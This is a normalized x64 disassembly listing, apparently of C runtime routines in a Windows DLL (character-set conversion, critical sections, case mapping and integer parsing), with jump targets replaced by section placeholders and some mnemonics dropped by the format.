movsxd r9 [ rax + 0x4 ]
add r9 rbx
mov rax [ r9 + 0x48 ]
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x48 ] rax
movzx eax [ r9 + 0x58 ]
movaps xmm0 [ rsp + 0x40 ]
movdqa [ rsp + 0x40 ] xmm0
mov r10 [ r13 ]
mov [ rsp + 0x28 ] r14d
mov [ rsp + 0x20 ] ax
lea r8 [ rsp + 0x40 ]
lea rdx [ rsp + 0x60 ]
mov rcx r13
call [ r10 + 0x38 ]
mov eax 0x4
cmp [ rsp + 0x60 ] 0x0
cmovne edi eax
mov [ rsp + 0xb0 ] edi
jmp r-xdata
xor edx edx
lea rcx [ rsp + 0xb8 ]
call sub_18001775c
mov rax [ r12 + 0x8 ]
test rax rax
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rbx + 0x48 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_180007270
nop
xor r8d r8d
call sub_1800037f0
nop
or edx 0x4
mov rsi rdi
cmp [ r12 + 0x8 ] rdi
cmove rsi r12
lea rcx [ rsp + 0xb8 ]
call sub_18001778c
test rsi rsi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax rbx
mov rbx [ rsp + 0xa8 ]
add rsp 0x70
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
mov rax [ rsi ]
mov edx 0x1
mov rcx rsi
call [ rax ]
nop
dec rax
mov [ r12 + 0x8 ] rax
sub_180016f18
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_1800185c4
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_180018b3c
sub_180016f50
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x10 ] dx
push rdi
sub rsp 0x40
mov rsi rcx
test r9 r9
jne r-xdata
mov ebx [ r9 ]
mov edi [ r9 + 0x4 ]
call sub_180019a1c
mov ebx [ rax + 0x8 ]
call sub_1800199e4
movzx edx [ rsp + 0x58 ]
mov edi eax
jmp r-xdata
and [ rsp + 0x68 ] 0x0
mov ecx edi
call sub_18001793c
mov rcx rax
call sub_1800199d0
lea rcx [ rsp + 0x68 ]
lea r8 [ rsp + 0x58 ]
mov [ rsp + 0x38 ] rcx
and [ rsp + 0x30 ] 0x0
mov [ rsp + 0x28 ] eax
mov ecx edi
mov r9d 0x1
xor edx edx
mov [ rsp + 0x20 ] rsi
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov eax 0xff
cmp dx ax
ja r-xdata
test ebx ebx
jne r-xdata
call sub_1800194ec
mov [ rax ] 0x2a
or eax 0xffffffff
cmp [ rsp + 0x68 ] 0x0
je r-xdata
mov [ rsi ] dl
lea eax [ rbx + 0x1 ]
jmp r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
sub_18001703c
push rbx
sub rsp 0x30
mov rax [ rcx ]
mov rbx r8
mov r8d edx
lea rdx [ rsp + 0x20 ]
call [ rax + 0x18 ]
mov rcx [ rbx + 0x8 ]
cmp [ rax + 0x8 ] rcx
jne r-xdata
xor eax eax
mov ecx [ rbx ]
cmp [ rax ] ecx
jne r-xdata
mov eax 0x1
jmp r-xdata
add rsp 0x30
pop rbx
retn
sub_1800170c8
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
and [ rsp + 0x38 ] 0x0
mov ecx r8d
mov rdi rdx
call sub_18001a1bc
and [ rdi + 0x10 ] 0x0
mov [ rdi + 0x18 ] 0xf
mov rcx rax
mov rbx rax
mov [ rdi ] 0x0
call sub_180019aa0
mov rdx rbx
mov rcx rdi
mov r8 rax
call sub_180006fe0
mov rbx [ rsp + 0x30 ]
mov rax rdi
add rsp 0x20
pop rdi
retn
sub_18001711c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
and [ rsp + 0x40 ] 0x0
mov rdi rdx
cmp r8d 0x1
jne r-xdata
mov ecx r8d
call sub_18001a1bc
and [ rdi + 0x10 ] 0x0
mov [ rdi + 0x18 ] 0xf
mov rcx rax
mov rbx rax
mov [ rdi ] 0x0
call sub_180019aa0
mov rdx rbx
and [ rdx + 0x10 ] 0x0
mov [ rdx + 0x18 ] 0xf
lea rcx [ r--data ]
mov [ rdx ] 0x0
call sub_180019aa0
lea rdx [ r--data ]
jmp r-xdata
mov r8 rax
mov rcx rdi
call sub_180006fe0
mov rbx [ rsp + 0x30 ]
mov rax rdi
add rsp 0x20
pop rdi
retn
sub_180017198
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx [ rcx + 0x38 ]
mov rdi rcx
jmp r-xdata
test rbx rbx
jne r-xdata
mov r8d [ rbx + 0x8 ]
mov rdx rdi
xor ecx ecx
call [ rbx + 0x10 ]
mov rbx [ rbx ]
mov rcx [ rdi + 0x30 ]
test rcx rcx
je r-xdata
mov rcx [ rdi + 0x38 ]
and [ rdi + 0x30 ] 0x0
test rcx rcx
je r-xdata
mov rbx [ rcx ]
call j_sub_180018b3c
mov rcx rbx
test rbx rbx
jne r-xdata
and [ rdi + 0x38 ] 0x0
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rbx [ rcx ]
call j_sub_180018b3c
mov rcx rbx
test rbx rbx
jne r-xdata
sub_180017208
push rbx
sub rsp 0x20
cmp [ rcx + 0x8 ] 0x0
mov rbx rcx
jbe r-xdata
mov rcx rbx
call sub_180017198
mov rbx [ rbx + 0x40 ]
test rbx rbx
je r-xdata
mov rax [ rbx + 0x8 ]
lea rcx [ rw-data ]
dec [ rcx + rax ]
cmp [ rcx + rax ] 0x0
jg r-xdata
add rsp 0x20
pop rbx
retn
mov rcx rbx
call sub_180003170
mov rcx rbx
call j_sub_180018b3c
sub_180017254
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rdi [ rcx + 0x8 ]
lea rcx [ rsp + 0x30 ]
xor edx edx
call sub_18001775c
mov rax [ rdi + 0x8 ]
test rax rax
je r-xdata
xor ebx ebx
lea rcx [ rsp + 0x30 ]
cmp [ rdi + 0x8 ] rbx
cmove rbx rdi
call sub_18001778c
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rax [ rbx ]
mov edx 0x1
mov rcx rbx
call [ rax ]
dec rax
mov [ rdi + 0x8 ] rax
sub_1800172b8
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx 0x10
call sub_180018a08
test rax rax
je r-xdata
mov [ rw-data ] rax
add rsp 0x20
pop rbx
retn
mov rdx [ rw-data ]
mov [ rax + 0x8 ] rbx
mov [ rax ] rdx
sub_1800172ec
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx [ rcx ]
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea rcx [ rsp + 0x30 ]
xor edx edx
call sub_18001775c
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
xor edi edi
lea rcx [ rsp + 0x30 ]
cmp [ rbx + 0x8 ] rdi
cmove rdi rbx
call sub_18001778c
test rdi rdi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax [ rdi ]
mov edx 0x1
mov rcx rdi
call [ rax ]
dec rax
mov [ rbx + 0x8 ] rax
sub_1800173c4
push rbp
push rsi
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov rdi rcx
xor edx edx
lea rcx [ rsp + 0x58 ]
call sub_18001775c
nop
mov rbx [ rdi + 0x18 ]
jmp r-xdata
test rbx rbx
jne r-xdata
dec rbx
mov rax [ rdi + 0x10 ]
cmp [ rax + rbx * 8 ] 0x0
je r-xdata
mov rcx [ rdi + 0x10 ]
call sub_180018b3c
nop
lea rcx [ rsp + 0x58 ]
call sub_18001778c
mov rbx [ rsp + 0x60 ]
add rsp 0x30
pop rdi
pop rsi
pop rbp
retn
mov rbp [ rax + rbx * 8 ]
xor edx edx
lea rcx [ rsp + 0x50 ]
call sub_18001775c
mov rax [ rbp + 0x8 ]
test rax rax
je r-xdata
xor esi esi
cmp [ rbp + 0x8 ] rsi
cmove rsi rbp
lea rcx [ rsp + 0x50 ]
call sub_18001778c
test rsi rsi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax [ rsi ]
mov edx 0x1
mov rcx rsi
call [ rax ]
dec rax
mov [ rbp + 0x8 ] rax
sub_18001748c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rsi rcx
mov rcx [ rcx ]
mov rbx rdx
cmp rcx rdx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rax rsi
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
test rcx rcx
je r-xdata
and [ rsi ] 0x0
test rbx rbx
je r-xdata
call sub_180018b3c
cmp [ rbx ] 0x0
mov rdi rbx
je r-xdata
sub rdi rbx
lea rcx [ rdi + 0x1 ]
call sub_18001b358
mov [ rsi ] rax
test rax rax
je r-xdata
inc rdi
cmp [ rdi ] 0x0
jne r-xdata
lea r8 [ rdi + 0x1 ]
mov rdx rbx
mov rcx rax
call sub_180018670
sub_180017504
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
xor edx edx
xor ecx ecx
call sub_18001b19c
lea rcx [ r--data ]
test rax rax
cmove rax rcx
lea rcx [ rdi + 0x28 ]
mov rdx rax
call sub_18001748c
test rbx rbx
je r-xdata
lea rax [ r--data ]
test rbx rbx
lea rcx [ rdi + 0x38 ]
cmove rbx rax
mov rdx rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
jmp sub_18001748c
mov rdx rbx
xor ecx ecx
call sub_18001b19c
mov rbx rax
sub_180017570
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov edi edx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx ] rax
call sub_1800173c4
nop
mov rcx [ rbx + 0x28 ]
test rcx rcx
je r-xdata
and [ rbx + 0x28 ] 0x0
lea rax [ r--data ]
mov [ rbx ] rax
test dil 0x1
je r-xdata
call sub_180018b3c
mov rax rbx
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
mov rcx rbx
call j_sub_180018b3c
sub_1800175d8
push rbx
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx [ rw-data ]
test rbx rbx
jne r-xdata
mov rax rbx
add rsp 0x30
pop rbx
retn
xor edx edx
lea rcx [ rsp + 0x48 ]
call sub_18001775c
nop
mov rbx [ rw-data ]
test rbx rbx
jne r-xdata
lea rcx [ rsp + 0x48 ]
call sub_18001778c
lea ecx [ rbx + 0x38 ]
call sub_180018a08
mov rbx rax
test rax rax
je r-xdata
xor ebx ebx
mov [ rax + 0x8 ] 0x1
lea rax [ r--data ]
mov [ rbx ] rax
and [ rbx + 0x10 ] 0x0
and [ rbx + 0x18 ] 0x0
and [ rbx + 0x20 ] 0x0
mov [ rbx + 0x24 ] 0x0
lea rcx [ rbx + 0x28 ]
and [ rcx ] 0x0
mov [ rcx + 0x8 ] 0x0
lea rdx [ r--data ]
call sub_18001748c
jmp r-xdata
lea rcx [ rsp + 0x40 ]
call sub_18001778c
mov r11 [ rw-data ]
mov [ rw-data ] r11
inc rcx
mov [ rbx + 0x8 ] rcx
mov rcx rbx
call sub_180017390
mov [ rbx + 0x20 ] 0x3f
lea rcx [ rbx + 0x28 ]
lea rdx [ r--data ]
call sub_18001748c
mov [ rw-data ] rbx
xor edx edx
lea rcx [ rsp + 0x40 ]
call sub_18001775c
mov rcx [ rbx + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
sub_1800176d4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
[ rw-data ]
jne r-xdata
mov rsi [ rsp + 0x38 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea rdi [ rw-data ]
mov esi 0x4
mov rcx rdi
call InitializeCriticalSection
add rdi 0x28
dec rsi
jne r-xdata
sub_180017720
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
[ rw-data ] 0xffffffff
jns r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea rbx [ rw-data ]
mov edi 0x4
mov rcx rbx
call DeleteCriticalSection
add rbx 0x28
dec rdi
jne r-xdata
sub_18001775c
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx ] edx
cmp edx 0x4
jge r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
movsxd rax edx
lea rdx [ rax + rax * 4 ]
lea rax [ rw-data ]
lea rcx [ rax + rdx * 8 ]
call EnterCriticalSection
sub_18001780c
mov [ rsp + 0x8 ] cx
sub rsp 0x38
mov rax rdx
mov edx 0xffff
mov [ rsp + 0x50 ] cx
cmp cx dx
je r-xdata
movzx eax cx
add rsp 0x38
retn
cmp [ rax ] 0x0
mov edx 0x100
jne r-xdata
lea rcx [ rsp + 0x50 ]
mov r9d 0x1
lea r8 [ rsp + 0x40 ]
mov [ rsp + 0x28 ] r9d
mov [ rsp + 0x20 ] rcx
mov ecx [ rax ]
call sub_18001b410
movzx ecx [ rsp + 0x50 ]
test eax eax
cmove cx [ rsp + 0x40 ]
cmp cx dx
jae r-xdata
lea eax [ rcx - 0x41 ]
cmp ax 0x19
ja r-xdata
add cx 0x20
jmp r-xdata
sub_18001787c
mov [ rsp + 0x8 ] cx
sub rsp 0x38
mov rax rdx
mov edx 0xffff
mov [ rsp + 0x50 ] cx
cmp cx dx
je r-xdata
movzx eax cx
add rsp 0x38
retn
cmp [ rax ] 0x0
jne r-xdata
lea rcx [ rsp + 0x50 ]
mov r9d 0x1
lea r8 [ rsp + 0x40 ]
mov [ rsp + 0x28 ] r9d
mov [ rsp + 0x20 ] rcx
mov ecx [ rax ]
mov edx 0x200
call sub_18001b410
movzx ecx [ rsp + 0x50 ]
test eax eax
cmove cx [ rsp + 0x40 ]
mov edx 0x100
cmp cx dx
jae r-xdata
lea eax [ rcx - 0x61 ]
cmp ax 0x19
ja r-xdata
sub cx 0x20
jmp r-xdata
sub_1800178f0
sub rsp 0x58
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x40 ] rax
mov r9d 0xa
lea rdx [ rsp + 0x21 ]
mov ecx ecx
lea r8d [ r9 + 0x15 ]
mov [ rsp + 0x20 ] 0x2e
call sub_18001b708
lea rdx [ rsp + 0x20 ]
xor ecx ecx
call sub_18001b064
mov rcx [ rsp + 0x40 ]
xor rcx rsp
call sub_180018450
add rsp 0x58
retn
sub_18001793c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
mov eax 0x8421085
mov r8d ecx
mov r12d ecx
mov ebp ecx
lea r13 [ rw-data ]
mul ecx
sub r8d edx
shr r8d 0x1
add r8d edx
shr r8d 0x5
imul r8d r8d 0x3e
sub r12d r8d
xor ebx ebx
test rbx rbx
jne r-xdata
cmp [ rdi + 0x8 ] ebp
je r-xdata
mov [ rbx ] rsi
mov rax rsi
[ r13 + r12 * 8 ] rbx
jne r-xdata
lea ecx [ rbx + 0x18 ]
call sub_18001b71c
mov rbx rax
test rax rax
je r-xdata
test rbx rbx
je r-xdata
mov rdi [ rdi ]
test rdi rdi
jne r-xdata
mov rsi [ r13 + r12 * 8 ]
mov rdi rsi
test rsi rsi
je r-xdata
mov rax [ rbx + 0x10 ]
xor eax eax
jmp r-xdata
mov ecx ebp
call sub_1800178f0
mov [ rbx + 0x10 ] rax
test rax rax
je r-xdata
mov rax [ rdi + 0x10 ]
jmp r-xdata
mov rcx [ rbx + 0x10 ]
call sub_18001a3c0
mov rcx rbx
call sub_180018b3c
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
mov rcx rbx
call sub_180018b3c
mov [ rbx + 0x8 ] ebp
sub_180017a18
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
lea rdi [ rw-data ]
mov esi 0x3e
add rdi 0x8
dec rsi
jne r-xdata
mov rcx [ rbp + 0x10 ]
mov rbx [ rbp ]
call sub_18001a3c0
mov rcx rbp
call sub_180018b3c
mov rbp rbx
test rbx rbx
jne r-xdata
xor ebp ebp
xchg [ rdi ] rbp
test rbp rbp
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_180017a9c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
xor r15d r15d
mov r12 r9
mov r14 r8
mov rdi rdx
mov rsi rcx
test rdx rdx
je r-xdata
xor eax eax
test r8 r8
je r-xdata
cmp [ rdx ] r15b
jne r-xdata
mov rax [ rsp + 0x80 ]
test rax rax
jne r-xdata
test rcx rcx
je r-xdata
mov ebx [ rax ]
mov r13d [ rax + 0x4 ]
call sub_180019a1c
mov ebx [ rax + 0x8 ]
call sub_1800199e4
mov r13d eax
jmp r-xdata
mov [ rcx ] r15w
mov ecx r13d
call sub_18001793c
mov rbp rax
cmp [ r12 ] r15d
je r-xdata
test rsi rsi
je r-xdata
test ebx ebx
jne r-xdata
test rax rax
jne r-xdata
mov cl [ rdi ]
mov [ r12 + 0x1 ] cl
mov rcx rax
call sub_1800199d0
cmp eax 0x1
jle r-xdata
mov eax 0x1
jmp r-xdata
movzx eax [ rdi ]
mov [ rsi ] ax
movzx ecx [ rdi ]
mov rax [ rax + 0x8 ]
movzx edx [ rax + rcx + 0x1d ]
and edx 0x4
call sub_18001b8a8
movzx ecx [ rdi ]
movzx edx [ rax + rcx * 2 ]
and edx 0x8000
jmp r-xdata
mov [ r12 ] r15d
mov ecx r15d
mov r9d 0x2
test rsi rsi
setne cl
lea edx [ r9 + 0x7 ]
mov r8 r12
mov [ rsp + 0x28 ] ecx
mov ecx r13d
mov [ rsp + 0x20 ] rsi
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov eax r15d
mov r9d 0x1
test rsi rsi
setne al
lea edx [ r9 + 0x8 ]
mov r8 rdi
mov [ rsp + 0x28 ] eax
mov ecx r13d
mov [ rsp + 0x20 ] rsi
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov rcx rbp
call sub_1800199d0
movsxd rcx eax
cmp r14 rcx
jae r-xdata
test edx edx
je r-xdata
mov [ r12 ] r15d
jmp r-xdata
mov rcx rbp
call sub_1800199d0
cmp eax 0x1
jle r-xdata
mov al [ rdi ]
mov [ r12 ] al
mov eax 0xfffffffe
jmp r-xdata
call sub_1800194ec
mov [ rax ] 0x2a
or eax 0xffffffff
jmp r-xdata
cmp [ rdi + 0x1 ] r15b
jne r-xdata
test rsi rsi
mov rcx rbp
mov ebx r15d
setne bl
call sub_1800199d0
mov r8 rdi
mov edx 0x9
mov ecx r13d
mov r9d eax
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rsi
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov rcx rbp
call sub_1800199d0
jmp r-xdata
jmp r-xdata
sub_180017c88
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180019a1c
mov edx [ rax + 0x4 ]
mov [ rbx ] edx
call sub_1800199e4
mov edx 0x2
mov ecx 0x100
mov [ rbx + 0x4 ] eax
call sub_18001b79c
mov [ rbx + 0x8 ] rax
test rax rax
je r-xdata
call sub_18001b8a8
and [ rbx + 0x10 ] 0x0
mov [ rbx + 0x8 ] rax
call sub_18001b8a8
mov rcx [ rbx + 0x8 ]
mov r8d 0x200
mov rdx rax
call sub_180018670
mov [ rbx + 0x10 ] 0x1
jmp r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180017cf4
mov [ rsp + 0x8 ] cx
sub rsp 0x28
mov ecx 0x1
lea r9 [ rsp + 0x40 ]
lea rdx [ rsp + 0x30 ]
mov r8d ecx
call [ GetStringTypeW@IAT ]
movsx edx [ rsp + 0x40 ]
neg eax
sbb ecx ecx
and ecx edx
movzx eax cx
add rsp 0x28
retn
sub_180017d28
push rbx
sub rsp 0x20
mov rax rdx
mov rbx rdx
mov r9 r8
sub rax rcx
mov rdx rcx
mov ecx 0x1
sar rax 0x1
mov r8d eax
call [ GetStringTypeW@IAT ]
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180017d7c
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
lea rsi [ rax + 0x8 ]
test rdx rdx
mov r12 rcx
mov rdi rcx
movzx ecx [ rcx ]
mov rbp r9
cmovne rsi rdx
mov r13d r8d
jmp r-xdata
call sub_18001bcc8
test eax eax
jne r-xdata
inc rdi
movzx ecx [ rdi ]
mov bl [ rdi ]
cmp bl 0x2d
je r-xdata
inc rdi
cmp bl 0x2b
je r-xdata
mov edi 0x7fffffff
cmp r12 [ rsi ]
jne r-xdata
mov [ rsi ] r12
mov bl 0x2b
jmp r-xdata
cmp bl 0x2b
jne r-xdata
test eax eax
jne r-xdata
mov r9 rbp
mov r8d r13d
mov rdx rsi
mov rcx rdi
call sub_180018158
mov r11d eax
cmp rdi [ rsi ]
jne r-xdata
cmp bl 0x2d
jne r-xdata
cmp eax edi
ja r-xdata
call sub_1800194ec
mov [ rax ] 0x22
test rbp rbp
je r-xdata
neg eax
cmp bl 0x2d
cmove r11d eax
mov eax r11d
cmp eax 0x80000000
jbe r-xdata
mov eax 0x80000000
cmp bl 0x2d
cmove edi eax
mov eax edi
jmp r-xdata
mov [ rbp ] 0x1
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
sub_180017e70
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
lea rsi [ rax + 0x8 ]
test rdx rdx
mov r12 rcx
mov rdi rcx
movzx ecx [ rcx ]
mov rbp r9
cmovne rsi rdx
mov r13d r8d
jmp r-xdata
call sub_18001bcc8
test eax eax
jne r-xdata
inc rdi
movzx ecx [ rdi ]
mov bl [ rdi ]
cmp bl 0x2d
je r-xdata
inc rdi
cmp bl 0x2b
je r-xdata
mov rdi 0x8000000000000000
cmp r12 [ rsi ]
jne r-xdata
mov [ rsi ] r12
mov bl 0x2b
jmp r-xdata
cmp bl 0x2b
jne r-xdata
test rax rax
jne r-xdata
mov r9 rbp
mov r8d r13d
mov rdx rsi
mov rcx rdi
call sub_180017f64
mov r11 rax
cmp rdi [ rsi ]
jne r-xdata
cmp bl 0x2d
jne r-xdata
mov rax 0x7fffffffffffffff
cmp r11 rax
ja r-xdata
call sub_1800194ec
mov [ rax ] 0x22
test rbp rbp
je r-xdata
mov rax r11
neg rax
cmp bl 0x2d
cmove r11 rax
mov rax r11
cmp r11 rdi
jbe r-xdata
sub bl 0x2d
neg bl
sbb rax rax
add rax rdi
jmp r-xdata
mov [ rbp ] 0x1
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
sub_180017f64
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x38
mov r14 r9
mov esi r8d
mov rbp rdx
mov r13 rcx
test r9 r9
je r-xdata
mov rbx rcx
movzx ecx [ rcx ]
jmp r-xdata
and [ r9 ] 0x0
call sub_18001bcc8
test eax eax
jne r-xdata
inc rbx
movzx ecx [ rbx ]
mov r12b [ rbx ]
cmp r12b 0x2d
je r-xdata
inc rbx
cmp r12b 0x2b
je r-xdata
test rbp rbp
je r-xdata
cmp esi 0x1
je r-xdata
mov r12b 0x2b
jmp r-xdata
xor eax eax
mov [ rbp ] r13
cmp esi 0x24
jg r-xdata
test esi esi
js r-xdata
mov cl 0x30
test esi esi
jle r-xdata
cmp [ rbx ] cl
je r-xdata
cmp esi 0x10
jne r-xdata
mov al [ rbx + 0x1 ]
cmp al 0x78
je r-xdata
mov esi 0xa
jmp r-xdata
mov r15 rbx
jmp r-xdata
cmp [ rbx ] cl
jne r-xdata
mov esi 0x10
cmp al 0x58
je r-xdata
cmp [ rbx ] cl
je r-xdata
mov al [ rbx + 0x1 ]
cmp al 0x78
je r-xdata
mov esi 0x8
jmp r-xdata
inc rbx
movsx ecx [ rbx ]
xor edi edi
mov [ rsp + 0x20 ] rbx
and [ rsp + 0x80 ] rdi
mov [ rsp + 0x90 ] dil
movsxd rsi esi
call sub_18001d2b0
lea rcx [ r--data ]
mov r8 rsi
mov edx eax
call sub_180018bf4
test rax rax
je r-xdata
add rbx 0x2
cmp al 0x58
jne r-xdata
cmp r15 rbx
je r-xdata
lea r14 [ r--data ]
jmp r-xdata
lea rax [ r--data ]
mov rcx rbx
movsx rax [ rsi + rax ]
sub rcx rax
sub rcx [ rsp + 0x20 ]
js r-xdata
mov bpl al
mov [ rsp + 0x80 ] rdi
mov rcx rsi
sub bpl r14b
inc rbx
imul rcx rdi
movsx rdi bpl
mov [ rsp + 0x90 ] bpl
add rdi rcx
movsx ecx [ rbx ]
call sub_18001d2b0
mov r8 rsi
mov rcx r14
mov edx eax
call sub_180018bf4
test rax rax
jne r-xdata
mov rbp [ rsp + 0x88 ]
mov r14 [ rsp + 0x98 ]
cmp r12b 0x2d
jne r-xdata
test rcx rcx
jg r-xdata
test rbp rbp
je r-xdata
neg rdi
call sub_1800194ec
mov [ rax ] 0x22
test r14 r14
je r-xdata
movsx rcx [ rsp + 0x90 ]
mov rax rdi
sub rax rcx
cmp rdi rax
jb r-xdata
mov rax rdi
jmp r-xdata
mov [ rbp ] rbx
or rdi 0xffffffffffffffff
mov r12b 0x2b
mov [ r14 ] 0x1
xor edx edx
div rsi
cmp rax [ rsp + 0x80 ]
je r-xdata
add rsp 0x38
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_180018158
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x38
mov r14 r9
mov esi r8d
mov rbp rdx
mov r13 rcx
test r9 r9
je r-xdata
mov rbx rcx
movzx ecx [ rcx ]
jmp r-xdata
and [ r9 ] 0x0
call sub_18001bcc8
test eax eax
jne r-xdata
inc rbx
movzx ecx [ rbx ]
mov r12b [ rbx ]
cmp r12b 0x2d
je r-xdata
inc rbx
cmp r12b 0x2b
je r-xdata
test rbp rbp
je r-xdata
cmp esi 0x1
je r-xdata
mov r12b 0x2b
jmp r-xdata
xor eax eax
mov [ rbp ] r13
cmp esi 0x24
jg r-xdata
test esi esi
js r-xdata
mov cl 0x30
test esi esi
jle r-xdata
cmp [ rbx ] cl
je r-xdata
cmp esi 0x10
jne r-xdata
mov al [ rbx + 0x1 ]
cmp al 0x78
je r-xdata
mov esi 0xa
jmp r-xdata
mov [ rsp + 0x80 ] rbx
jmp r-xdata
cmp [ rbx ] cl
jne r-xdata
mov esi 0x10
cmp al 0x58
je r-xdata
cmp [ rbx ] cl
je r-xdata
mov al [ rbx + 0x1 ]
cmp al 0x78
je r-xdata
mov esi 0x8
jmp r-xdata
inc rbx
movsx ecx [ rbx ]
xor edi edi
mov [ rsp + 0x20 ] rbx
and [ rsp + 0x90 ] edi
movsxd r15 esi
call sub_18001d2b0
lea rcx [ r--data ]
mov r8 r15
mov edx eax
call sub_180018bf4
test rax rax
je r-xdata
add rbx 0x2
cmp al 0x58
jne r-xdata
mov r15b [ rsp + 0x90 ]
movsxd rbp esi
lea r14 [ r--data ]
jmp r-xdata
lea rcx [ r--data ]
movsxd rax esi
movsx rax [ rax + rcx ]
mov rcx rbx
sub rcx rax
sub rcx [ rsp + 0x20 ]
js r-xdata
mov [ rsp + 0x90 ] edi
sub al r14b
inc rbx
movsx ecx [ rbx ]
movsx r15d al
imul edi esi
add edi r15d
call sub_18001d2b0
mov r8 rbp
mov edx eax
mov rcx r14
call sub_180018bf4
test rax rax
jne r-xdata
mov rbp [ rsp + 0x88 ]
mov r14 [ rsp + 0x98 ]
jmp r-xdata
cmp r12b 0x2d
jne r-xdata
test rcx rcx
jg r-xdata
cmp [ rsp + 0x80 ] rbx
je r-xdata
test rbp rbp
je r-xdata
neg edi
call sub_1800194ec
mov [ rax ] 0x22
test r14 r14
je r-xdata
movsx ecx r15b
mov eax edi
sub eax ecx
cmp edi eax
jb r-xdata
